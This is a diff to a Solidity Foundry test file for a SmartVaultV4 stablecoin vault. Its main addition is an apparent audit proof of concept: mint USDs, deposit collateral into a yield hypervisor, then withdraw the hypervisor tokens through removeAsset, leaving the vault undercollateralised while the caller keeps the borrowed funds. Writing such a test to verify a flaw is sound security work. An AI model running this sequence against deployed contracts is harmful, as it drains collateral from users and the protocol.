@@ -2,6 +2,9 @@
 pragma solidity 0.8.17;
 
 import {Test} from "forge-std/Test.sol";
+import {console} from "forge-std/console.sol";
+
+import {IHypervisor} from "contracts/interfaces/IHypervisor.sol";
 
 import {SmartVaultFixture, SmartVaultV4} from "./fixtures/SmartVaultFixture.sol";
 
@@ -16,7 +19,7 @@ contract SmartVaultTest is SmartVaultFixture, Test {
 
         vm.expectRevert(SmartVaultV4.InvalidUser.selector);
         smartVault.setOwner(newOwner);
-        
+
         vm.prank(address(smartVaultManager));
         smartVault.setOwner(newOwner);
         assertEq(smartVault.owner(), newOwner);
@@ -43,7 +46,7 @@ contract SmartVaultTest is SmartVaultFixture, Test {
         // expect emit USDsMinted
         // assert balances + fee
     }
-    
+
     function test_burnUsds() public {
         // expect revert Overrepay
         // expect emit USDsBurned
@@ -91,5 +94,28 @@ contract SmartVaultTest is SmartVaultFixture, Test {
 
     function test_yieldSwapRatio() public {
         // reverts if no convergence
+    }
+
+    function test_pocDepositYieldRemoveCollateral() public {
+        // borrow usds -> deposit yield -> SmartVaultV4::removeAsset (hypervisor token) -> profit
+        // what happens to liquidation?
+
+        SmartVaultV4 smartVault = smartVaults[VAULT_OWNER][0].vault;
+
+        vm.deal(VAULT_OWNER, 1 ether);
+        vm.startPrank(VAULT_OWNER);
+        address(smartVault).call{value: 1 ether}("");
+        SmartVaultV4.Status memory status = smartVault.status();
+        smartVault.mint(VAULT_OWNER, status.maxMintable * 90 / 100);
+        smartVault.depositYield(NATIVE, 1e5);
+        SmartVaultV4.YieldPair[] memory yieldPairs = smartVault.yieldAssets();
+        assertEq(yieldPairs.length, 1);
+        address hypervisor = yieldPairs[0].hypervisor;
+        smartVault.removeAsset(yieldPairs[0].hypervisor, IHypervisor(hypervisor).balanceOf(VAULT_OWNER), VAULT_OWNER);
+        vm.stopPrank();
+
+        console.log("Undercollateralised: %s", smartVault.undercollateralised());
+        console.log("USDS balance: %s", usds.balanceOf(VAULT_OWNER));
+        console.log("Hypervisor balance: %s", IHypervisor(hypervisor).balanceOf(VAULT_OWNER));
     }
 }
